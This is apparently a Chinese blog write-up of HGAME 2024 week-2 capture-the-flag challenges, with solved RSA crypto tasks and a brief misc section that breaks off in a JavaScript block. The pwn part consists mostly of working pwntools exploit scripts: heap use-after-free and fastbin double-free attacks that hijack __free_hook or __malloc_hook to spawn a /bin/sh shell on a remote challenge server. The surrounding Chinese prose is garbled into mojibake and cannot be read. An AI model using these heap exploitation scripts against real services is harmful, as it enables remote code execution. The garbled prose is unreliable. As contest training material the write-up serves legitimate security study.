ï¼š</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> secret <span class="keyword">import</span> flag</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">padding</span>(<span class="params">flag</span>):</span><br><span class="line">    <span class="keyword">return</span> flag+<span class="string">b&#x27;\xff&#x27;</span>*(<span class="number">64</span>-<span class="built_in">len</span>(flag))</span><br><span class="line"></span><br><span class="line">flag=padding(flag)</span><br><span class="line">m=bytes_to_long(flag)</span><br><span class="line">p=getPrime(<span class="number">512</span>)</span><br><span class="line">q=getPrime(<span class="number">512</span>)</span><br><span class="line">e=<span class="number">3</span></span><br><span class="line">n=p*q</span><br><span class="line">c=<span class="built_in">pow</span>(m,e,n)</span><br><span class="line">m0=m&gt;&gt;<span class="number">208</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&#x27;n=<span class="subst">&#123;n&#125;</span>&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&#x27;c=<span class="subst">&#123;c&#125;</span>&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&#x27;m0=<span class="subst">&#123;m0&#125;</span>&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">n=120838778421252867808799302603972821425274682456261749029016472234934876266617266346399909705742862458970575637664059189613618956880430078774892479256301209695323302787221508556481196281420676074116272495278097275927604857336484564777404497914572606299810384987412594844071935546690819906920254004045391585427</span></span><br><span class="line"><span class="string">c=118961547254465282603128910126369011072248057317653811110746611348016137361383017921465395766977129601435508590006599755740818071303929227578504412967513468921191689357367045286190040251695094706564443721393216185563727951256414649625597950957960429709583109707961019498084511008637686004730015209939219983527</span></span><br><span class="line"><span class="string">m0=13292147408567087351580732082961640130543313742210409432471625281702327748963274496942276607</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>ç›´æ¥<code>long_to_bytes</code>è§£<code>m0</code>å³å¯å¾—åˆ°flagã€‚</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">m0=<span class="number">13292147408567087351580732082961640130543313742210409432471625281702327748963274496942276607</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(long_to_bytes(m0))</span><br><span class="line"><span class="comment"># b&#x27;hgame&#123;0ther_cas3s_0f_c0ppr3smith&#125;\xff\xff\xff\xff\xff&#x27;</span></span><br></pre></td></tr></table></figure><h2 id="midRSA-revenge"><a href="#midRSA-revenge" class="headerlink" title="midRSA revenge"></a>midRSA revenge</h2><p>æºç ï¼š</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> secret <span class="keyword">import</span> flag</span><br><span class="line">m=bytes_to_long(flag)</span><br><span class="line">p=getPrime(<span class="number">1024</span>)</span><br><span class="line">q=getPrime(<span class="number">1024</span>)</span><br><span class="line">e=<span class="number">5</span></span><br><span class="line">n=p*q</span><br><span class="line">c=<span class="built_in">pow</span>(m,e,n)</span><br><span class="line">m0=m&gt;&gt;<span class="number">128</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&#x27;n=<span class="subst">&#123;n&#125;</span>&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&#x27;c=<span class="subst">&#123;c&#125;</span>&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&#x27;m0=<span class="subst">&#123;m0&#125;</span>&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">n=27814334728135671995890378154778822687713875269624843122353458059697288888640572922486287556431241786461159513236128914176680497775619694684903498070577307810263677280294114135929708745988406963307279767028969515305895207028282193547356414827419008393701158467818535109517213088920890236300281646288761697842280633285355376389468360033584102258243058885174812018295460196515483819254913183079496947309574392848378504246991546781252139861876509894476420525317251695953355755164789878602945615879965709871975770823484418665634050103852564819575756950047691205355599004786541600213204423145854859214897431430282333052121</span></span><br><span class="line"><span class="string">c=456221314115867088638207203034494636244706611111621723577848729096069230067958132663018625661447131501758684502639383208332844681939698124459188571813527149772292464139530736717619741704945926075632064072125361516435631121845753186559297993355270779818057702973783391589851159114029310296551701456748698914231344835187917559305440269560613326893204748127999254902102919605370363889581136724164096879573173870280806620454087466970358998654736755257023225078147018537101</span></span><br><span class="line"><span class="string">m0=9999900281003357773420310681169330823266532533803905637</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>rsaé«˜ä½mæ³„éœ²ï¼Œå‚è€ƒï¼š<a href="https://blog.csdn.net/XiongSiqi_blog/article/details/130138213">mé«˜ä½æ”»å‡»</a></p><p>ç”¨sageè·‘å‡ºmã€‚</p><p>å› ä¸ºåœ¨çº¿çš„sageç½‘ç«™æ²¡æœ‰<code>Crypto.Util.number</code>åº“ï¼Œè‡ªå·±å†™ä¸€ä¸ª<code>long_to_bytes</code>å‡½æ•°ã€‚</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># sage</span></span><br><span class="line">n=<span class="number">27814334728135671995890378154778822687713875269624843122353458059697288888640572922486287556431241786461159513236128914176680497775619694684903498070577307810263677280294114135929708745988406963307279767028969515305895207028282193547356414827419008393701158467818535109517213088920890236300281646288761697842280633285355376389468360033584102258243058885174812018295460196515483819254913183079496947309574392848378504246991546781252139861876509894476420525317251695953355755164789878602945615879965709871975770823484418665634050103852564819575756950047691205355599004786541600213204423145854859214897431430282333052121</span></span><br><span class="line">c=<span class="number">456221314115867088638207203034494636244706611111621723577848729096069230067958132663018625661447131501758684502639383208332844681939698124459188571813527149772292464139530736717619741704945926075632064072125361516435631121845753186559297993355270779818057702973783391589851159114029310296551701456748698914231344835187917559305440269560613326893204748127999254902102919605370363889581136724164096879573173870280806620454087466970358998654736755257023225078147018537101</span></span><br><span class="line">m0=<span class="number">9999900281003357773420310681169330823266532533803905637</span></span><br><span class="line">m_high = m0&lt;&lt;<span class="number">128</span></span><br><span class="line">e = <span class="number">5</span></span><br><span class="line">kbits = <span class="number">128</span></span><br><span class="line">PR.&lt;x&gt; = PolynomialRing(Zmod(n))</span><br><span class="line">f = (m_high + x)^e - c</span><br><span class="line">x0 = f.small_roots(<span class="number">2</span>^kbits,<span class="number">1</span>)[<span class="number">0</span>]</span><br><span class="line">m = m_high + x0</span><br><span class="line"><span class="built_in">print</span>(m)</span><br><span class="line">hex_value=<span class="built_in">hex</span>(m)[<span class="number">2</span>:]</span><br><span class="line">flag = <span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(hex_value), <span class="number">2</span>):</span><br><span class="line">    hex_byte = hex_value[i:i+<span class="number">2</span>]  <span class="comment"># æ¯ä¸¤ä¸ªå­—ç¬¦ä¸ºä¸€ä¸ªåå…­è¿›åˆ¶å­—èŠ‚</span></span><br><span class="line">    decimal_value = <span class="built_in">int</span>(hex_byte, <span class="number">16</span>)  <span class="comment"># å°†åå…­è¿›åˆ¶å­—èŠ‚è½¬æ¢ä¸ºåè¿›åˆ¶å€¼</span></span><br><span class="line">    char = <span class="built_in">chr</span>(decimal_value)  <span class="comment"># å°†åè¿›åˆ¶å€¼è½¬æ¢ä¸ºå­—ç¬¦</span></span><br><span class="line">    flag += char</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(flag)</span><br><span class="line"></span><br><span class="line"><span class="string">&quot;&quot;&quot; </span></span><br><span class="line"><span class="string">m = 3402789736593180236658155503802934243882633217001276110520820253391839278880462965966606922621</span></span><br><span class="line"><span class="string">hgame&#123;c0ppr3smith_St3re0typed_m3ssag3s&#125;</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br></pre></td></tr></table></figure><h2 id="babyRSA"><a href="#babyRSA" class="headerlink" title="babyRSA"></a>babyRSA</h2><p>æºç ï¼š</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> secret <span class="keyword">import</span> flag,e</span><br><span class="line">m=bytes_to_long(flag)</span><br><span class="line">p=getPrime(<span class="number">64</span>)</span><br><span class="line">q=getPrime(<span class="number">256</span>)</span><br><span class="line">n=p**<span class="number">4</span>*q</span><br><span class="line">k=getPrime(<span class="number">16</span>)</span><br><span class="line">gift=<span class="built_in">pow</span>(e+<span class="number">114514</span>+p**k,<span class="number">0x10001</span>,p)</span><br><span class="line">c=<span class="built_in">pow</span>(m,e,n)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&#x27;p=<span class="subst">&#123;p&#125;</span>&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&#x27;q=<span class="subst">&#123;q&#125;</span>&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&#x27;c=<span class="subst">&#123;c&#125;</span>&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&#x27;gift=<span class="subst">&#123;gift&#125;</span>&#x27;</span>)</span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">p=14213355454944773291</span></span><br><span class="line"><span class="string">q=61843562051620700386348551175371930486064978441159200765618339743764001033297</span></span><br><span class="line"><span class="string">c=105002138722466946495936638656038214000043475751639025085255113965088749272461906892586616250264922348192496597986452786281151156436229574065193965422841</span></span><br><span class="line"><span class="string">gift=9751789326354522940</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>å…ˆæ±‚eï¼Œé€šè¿‡åŒ–ç®€ï¼Œå¯ä»¥çŸ¥é“ <code>gift=pow(e+114514,0x10001,p)</code>ï¼Œå¯ä»¥æ±‚å‡º<code>e</code>ã€‚</p><p>æ¥ç€æ˜¯æ±‚mï¼Œå¯ä»¥å‘ç°<code>p-1</code>æ˜¯<code>e</code>çš„å€æ•°ï¼Œè¦ç”¨AMMç®—æ³•æ¥æ±‚mã€‚</p><p>å‚è€ƒé“¾æ¥ï¼š<a href="https://lazzzaro.github.io/2020/05/06/crypto-RSA/index.html">RSA</a></p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#Sage</span></span><br><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line">p=<span class="number">14213355454944773291</span></span><br><span class="line">q=<span class="number">61843562051620700386348551175371930486064978441159200765618339743764001033297</span></span><br><span class="line">c=<span class="number">105002138722466946495936638656038214000043475751639025085255113965088749272461906892586616250264922348192496597986452786281151156436229574065193965422841</span></span><br><span class="line">gift=<span class="number">9751789326354522940</span></span><br><span class="line">d1 = gmpy2.invert(<span class="number">0x10001</span>, (p - <span class="number">1</span>))</span><br><span class="line">e = <span class="built_in">pow</span>(gift, d1, p)-<span class="number">114514</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> mp <span class="keyword">in</span> GF(p)(c).nth_root(e, <span class="built_in">all</span>=<span class="literal">True</span>):</span><br><span class="line">    <span class="keyword">for</span> mq <span class="keyword">in</span> GF(q)(c).nth_root(e, <span class="built_in">all</span>=<span class="literal">True</span>):</span><br><span class="line">        m = crt([ZZ(mp), ZZ(mq)], [p, q])</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            res = <span class="built_in">bytes</span>.fromhex(<span class="built_in">hex</span>(m)[<span class="number">2</span>:])</span><br><span class="line">            <span class="keyword">if</span> res.isascii():</span><br><span class="line">                <span class="built_in">print</span>(res)</span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            <span class="keyword">pass</span></span><br><span class="line"><span class="comment"># b&#x27;hgame&#123;Ad1eman_Mand3r_Mi11er_M3th0d&#125;&#x27;</span></span><br></pre></td></tr></table></figure><h1 id="Pwn"><a href="#Pwn" class="headerlink" title="Pwn"></a>Pwn</h1><h2 id="Elden-Ring-â…¡"><a href="#Elden-Ring-â…¡" class="headerlink" title="Elden Ring â…¡"></a>Elden Ring â…¡</h2><p>å †çš„uafï¼Œä¸æ€ä¹ˆä¼šã€‚</p><p>å‚è€ƒé“¾æ¥ï¼š<a href="https://blog.csdn.net/weixin_73290593/article/details/128831906">Hgame-2023(å‰ä¸‰å‘¨pwné¢˜è§£)</a></p><p>å’ŒHgame-2023 week2çš„ editablenoteå·®ä¸å¤šï¼Œç›´æ¥ç”¨expå°±èƒ½è·‘ï¼ˆ</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context(os = <span class="string">&#x27;linux&#x27;</span>, arch = <span class="string">&#x27;amd64&#x27;</span>, log_level = <span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line">libc=ELF(<span class="string">&#x27;./libc.so.6&#x27;</span>)</span><br><span class="line">p = remote(<span class="string">&#x27;106.14.57.14&#x27;</span>,<span class="number">30261</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">leng,color</span>):</span><br><span class="line">p.sendlineafter(<span class="string">b&#x27;&gt;&#x27;</span>,<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">p.sendlineafter(<span class="string">b&#x27;Index:&#x27;</span>,<span class="built_in">str</span>(leng).encode())</span><br><span class="line">p.sendlineafter(<span class="string">b&#x27;Size:&#x27;</span>,<span class="built_in">str</span>(color).encode())</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete</span>(<span class="params">id1</span>):</span><br><span class="line">p.sendlineafter(<span class="string">b&#x27;&gt;&#x27;</span>,<span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line">p.sendlineafter(<span class="string">b&#x27;Index:&#x27;</span>,<span class="built_in">str</span>(id1).encode())</span><br><span class="line"> </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>(<span class="params">id1</span>):</span><br><span class="line">p.sendlineafter(<span class="string">b&#x27;&gt;&#x27;</span>,<span class="string">b&#x27;4&#x27;</span>)</span><br><span class="line">p.sendlineafter(<span class="string">b&#x27;Index:&#x27;</span>,<span class="built_in">str</span>(id1).encode())</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">id1,name</span>):</span><br><span class="line">p.sendlineafter(<span class="string">b&#x27;&gt;&#x27;</span>,<span class="string">b&#x27;3&#x27;</span>)</span><br><span class="line">p.sendlineafter(<span class="string">b&#x27;Index:&#x27;</span>,<span class="built_in">str</span>(id1).encode())</span><br><span class="line">p.sendafter(<span class="string">b&#x27;Content:&#x27;</span>,name)</span><br><span class="line">  </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">pwn</span>():</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">8</span>):</span><br><span class="line">        add(i,<span class="number">0x80</span>)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>):</span><br><span class="line">        delete(i)</span><br><span class="line">    </span><br><span class="line">    add(<span class="number">8</span>,<span class="number">0x20</span>)</span><br><span class="line">    delete(<span class="number">7</span>)</span><br><span class="line">    show(<span class="number">7</span>)</span><br><span class="line">    libc_base=u64(p.recvuntil(<span class="string">b&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))-<span class="number">0x1ecbe0</span></span><br><span class="line">    __free_hook=libc_base+libc.sym[<span class="string">&quot;__free_hook&quot;</span>]</span><br><span class="line">    system_addr=libc_base+libc.sym[<span class="string">&quot;system&quot;</span>]</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;libc_base--&gt;&quot;</span>+<span class="built_in">hex</span>(libc_base))</span><br><span class="line"></span><br><span class="line">    add(<span class="number">9</span>,<span class="number">0x20</span>)</span><br><span class="line">    delete(<span class="number">9</span>)</span><br><span class="line">    delete(<span class="number">8</span>)</span><br><span class="line">    edit(<span class="number">8</span>,p64(__free_hook))</span><br><span class="line">    add(<span class="number">10</span>,<span class="number">0x20</span>)</span><br><span class="line">    add(<span class="number">11</span>,<span class="number">0x20</span>)</span><br><span class="line">    edit(<span class="number">11</span>,p64(system_addr))</span><br><span class="line">    edit(<span class="number">10</span>,<span class="string">&#x27;/bin/sh\x00&#x27;</span>)</span><br><span class="line">    delete(<span class="number">10</span>)</span><br><span class="line">    p.interactive()</span><br><span class="line"></span><br><span class="line">pwn()</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="/./hgame2024_week2/p_1_1.png"></p><h2 id="fastnote"><a href="#fastnote" class="headerlink" title="fastnote"></a>fastnote</h2><p>fastbin double free</p><p>å‚è€ƒé“¾æ¥ï¼š<a href="https://blog.csdn.net/qq_62172019/article/details/133359490">HGAME 2023 new_fast_note</a></p><p>ä¹Ÿæ˜¯æ‹¿é‡Œé¢çš„è„šæœ¬æ”¹ä¸€ä¸‹å³å¯</p><p>exp</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context(os = <span class="string">&#x27;linux&#x27;</span>, arch = <span class="string">&#x27;amd64&#x27;</span>, log_level = <span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line">p = remote(<span class="string">&#x27;106.14.57.14&#x27;</span>,<span class="number">30208</span>)</span><br><span class="line">libc = ELF(<span class="string">&quot;./libc-2.31.so&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">idx,size,data</span>):</span><br><span class="line">p.recvuntil(<span class="string">b&#x27;Your choice:&#x27;</span>)</span><br><span class="line">p.sendline(<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">p.recvuntil(<span class="string">b&#x27;Index: &#x27;</span>)</span><br><span class="line">p.sendline(<span class="built_in">str</span>(idx).encode())</span><br><span class="line">p.recvuntil(<span class="string">b&#x27;Size: &#x27;</span>)</span><br><span class="line">p.sendline(<span class="built_in">str</span>(size).encode())</span><br><span class="line">p.recvuntil(<span class="string">b&#x27;Content: &#x27;</span>)</span><br><span class="line">p.send(data)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">free</span>(<span class="params">idx</span>):</span><br><span class="line">p.recvuntil(<span class="string">b&#x27;Your choice:&#x27;</span>)</span><br><span class="line">p.sendline(<span class="string">b&#x27;3&#x27;</span>)</span><br><span class="line">p.recvuntil(<span class="string">b&#x27;Index: &#x27;</span>)</span><br><span class="line">p.sendline(<span class="built_in">str</span>(idx).encode())</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>(<span class="params">idx</span>):</span><br><span class="line">p.recvuntil(<span class="string">b&#x27;Your choice:&#x27;</span>)</span><br><span class="line">p.sendline(<span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line">p.recvuntil(<span class="string">b&#x27;Index: &#x27;</span>)</span><br><span class="line">p.sendline(<span class="built_in">str</span>(idx).encode())</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">9</span>):</span><br><span class="line">add(i,<span class="number">0x80</span>,<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">8</span>):</span><br><span class="line">free(i)</span><br><span class="line">show(<span class="number">7</span>) </span><br><span class="line">libc_base = u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>)) - <span class="number">0x1ecb80</span> - <span class="number">96</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(libc_base))</span><br><span class="line">add(<span class="number">0</span>,<span class="number">0x20</span>,<span class="string">b&#x27;aaaaaaaa&#x27;</span>) </span><br><span class="line">add(<span class="number">1</span>,<span class="number">0x20</span>,<span class="string">b&#x27;aaaaaaaa&#x27;</span>) </span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line">free(<span class="number">1</span>)</span><br><span class="line">show(<span class="number">1</span>)</span><br><span class="line">heap_base = u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>)) - <span class="number">0x3f0</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(heap_base))</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">2</span>,<span class="number">11</span>):</span><br><span class="line">add(i,<span class="number">0x20</span>,<span class="string">b&#x27;a&#x27;</span> * <span class="number">0x10</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">2</span>,<span class="number">11</span>):</span><br><span class="line">free(i)</span><br><span class="line">free(<span class="number">9</span>) </span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>):</span><br><span class="line">add(<span class="number">0</span>,<span class="number">0x20</span>,<span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line">free_hook = libc_base + libc.sym[<span class="string">&#x27;__free_hook&#x27;</span>]</span><br><span class="line">sys_addr = libc_base + libc.sym[<span class="string">&#x27;system&#x27;</span>] </span><br><span class="line">add(<span class="number">1</span>,<span class="number">0x20</span>,p64(free_hook))</span><br><span class="line">add(<span class="number">2</span>,<span class="number">0x20</span>,p64(sys_addr)) </span><br><span class="line">add(<span class="number">2</span>,<span class="number">0x20</span>,p64(sys_addr))</span><br><span class="line">add(<span class="number">2</span>,<span class="number">0x20</span>,p64(sys_addr))</span><br><span class="line">add(<span class="number">3</span>,<span class="number">0x40</span>,<span class="string">b&#x27;/bin/sh\x00&#x27;</span>)</span><br><span class="line">free(<span class="number">3</span>)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p><img src="/./hgame2024_week2/p_2_1.png"></p><h2 id="old-fastnote"><a href="#old-fastnote" class="headerlink" title="old_fastnote"></a>old_fastnote</h2><p>å‚è€ƒé“¾æ¥ï¼š<a href="https://blog.csdn.net/weixin_73290593/article/details/128831906">Hgame-2023(å‰ä¸‰å‘¨pwné¢˜è§£)</a></p><p>è¿™æ¬¡æ˜¯<code>libc-2.23.so</code></p><p>exp:</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context(os = <span class="string">&#x27;linux&#x27;</span>, arch = <span class="string">&#x27;amd64&#x27;</span>, log_level = <span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line">p = remote(<span class="string">&#x27;106.14.57.14&#x27;</span>,<span class="number">30350</span>)</span><br><span class="line">libc = ELF(<span class="string">&quot;./libc-2.23.so&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">idx,size,data</span>):</span><br><span class="line">p.recvuntil(<span class="string">b&#x27;Your choice:&#x27;</span>)</span><br><span class="line">p.sendline(<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">p.recvuntil(<span class="string">b&#x27;Index: &#x27;</span>)</span><br><span class="line">p.sendline(<span class="built_in">str</span>(idx).encode())</span><br><span class="line">p.recvuntil(<span class="string">b&#x27;Size: &#x27;</span>)</span><br><span class="line">p.sendline(<span class="built_in">str</span>(size).encode())</span><br><span class="line">p.recvuntil(<span class="string">b&#x27;Content: &#x27;</span>)</span><br><span class="line">p.send(data)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">free</span>(<span class="params">idx</span>):</span><br><span class="line">p.recvuntil(<span class="string">b&#x27;Your choice:&#x27;</span>)</span><br><span class="line">p.sendline(<span class="string">b&#x27;3&#x27;</span>)</span><br><span class="line">p.recvuntil(<span class="string">b&#x27;Index: &#x27;</span>)</span><br><span class="line">p.sendline(<span class="built_in">str</span>(idx).encode())</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>(<span class="params">idx</span>):</span><br><span class="line">p.recvuntil(<span class="string">b&#x27;Your choice:&#x27;</span>)</span><br><span class="line">p.sendline(<span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line">p.recvuntil(<span class="string">b&#x27;Index: &#x27;</span>)</span><br><span class="line">p.sendline(<span class="built_in">str</span>(idx).encode())</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">add(<span class="number">0</span>,<span class="number">0x80</span>,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">add(<span class="number">1</span>,<span class="number">0x60</span>,<span class="string">&#x27;b&#x27;</span>)</span><br><span class="line">add(<span class="number">2</span>,<span class="number">0x60</span>,<span class="string">&#x27;c&#x27;</span>)</span><br><span class="line">add(<span class="number">3</span>,<span class="number">0x20</span>,<span class="string">&#x27;d&#x27;</span>)</span><br><span class="line"></span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line">libc_base=u64(p.recvuntil(<span class="string">b&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))-<span class="number">0x58</span>-<span class="number">0x10</span>-libc.sym[<span class="string">&quot;__malloc_hook&quot;</span>]</span><br><span class="line">__malloc_hook=libc_base+libc.sym[<span class="string">&quot;__malloc_hook&quot;</span>]</span><br><span class="line">realloc=libc_base+libc.sym[<span class="string">&quot;__libc_realloc&quot;</span>]</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;libc_base--&gt;&quot;</span>+<span class="built_in">hex</span>(libc_base))</span><br><span class="line"></span><br><span class="line">one_gadget=[<span class="number">0x45226</span>,<span class="number">0x4527a</span>,<span class="number">0xf03a4</span>,<span class="number">0xf1247</span>]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">4</span>):</span><br><span class="line">one_gadget[i]+=libc_base</span><br><span class="line"></span><br><span class="line">free(<span class="number">1</span>)</span><br><span class="line">free(<span class="number">2</span>)</span><br><span class="line">free(<span class="number">1</span>)</span><br><span class="line">add(<span class="number">4</span>,<span class="number">0x60</span>,p64(__malloc_hook-<span class="number">0x23</span>))</span><br><span class="line">add(<span class="number">5</span>,<span class="number">0x60</span>,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">add(<span class="number">6</span>,<span class="number">0x60</span>,<span class="string">&#x27;b&#x27;</span>)</span><br><span class="line">payload=<span class="string">b&#x27;\x00&#x27;</span>*<span class="number">0xb</span>+p64(one_gadget[<span class="number">3</span>])+p64(realloc+<span class="number">6</span>)</span><br><span class="line">add(<span class="number">7</span>,<span class="number">0x60</span>,payload)</span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">&quot;Your choice:&quot;</span>,<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">p.sendlineafter(<span class="string">&quot;Index: &quot;</span>,<span class="string">&#x27;8&#x27;</span>)</span><br><span class="line">p.sendlineafter(<span class="string">&quot;Size: &quot;</span>,<span class="string">&quot;0x55&quot;</span>)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="/./hgame2024_week2/p_3_1.png"></p><h1 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h1><h2 id="ek1ng-want-girlfriend"><a href="#ek1ng-want-girlfriend" class="headerlink" title="ek1ng_want_girlfriend"></a>ek1ng_want_girlfriend</h2><p>ç”¨Wiresharkä»HTTPæµé‡ä¸­æå–å‡ºæ–‡ä»¶ï¼Œå¾—åˆ°ä¸€ä¸ªjpgå›¾ç‰‡ï¼Œå›¾ç‰‡åº•éƒ¨æœ‰flagã€‚</p><p><img src="/./hgame2024_week2/m_1_1.jpg"></p><h2 id="æˆ‘è¦æˆä¸ºåå®¹é“é«˜æ‰‹"><a href="#æˆ‘è¦æˆä¸ºåå®¹é“é«˜æ‰‹" class="headerlink" title="æˆ‘è¦æˆä¸ºåå®¹é“é«˜æ‰‹"></a>æˆ‘è¦æˆä¸ºåå®¹é“é«˜æ‰‹</h2><p>åœ¨githubä¸Šæ‰¾åˆ°äº†ä¸€ä¸ªè§£å†³åå®¹é“çš„jsä»£ç </p><p>å‚è€ƒé“¾æ¥ï¼š<a href="https://github.com/conwnet/huarongdao/">åå®¹é“</a></p><p>ç”¨jsä»£ç å†™ä¸€ä¸ªçˆ¬è™«ï¼Œæ¥æ”¶æ£‹ç›˜å­—ç¬¦ä¸²ï¼Œè§£å†³åå†å‘é€è¿‡å»ã€‚</p><p>jsç¨€çƒ‚ï¼Œå†™çš„æ˜¯å±å±±ä»£ç ï¼Œç”¨é€’å½’æ¥è§£å†³æ–°çš„<code>layout</code>ã€‚</p><p>nodejsè¿è¡Œï¼Œå³å¯å¾—åˆ°flagã€‚</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * </span></span><br><span class="line"><span class="comment"> * </span></span><br><span class="line"><span class="comment"> * 0 ç©ºä½</span></span><br><span class="line"><span class="comment"> * 1 å®ä½“</span></span><br><span class="line"><span class="comment"> * 2 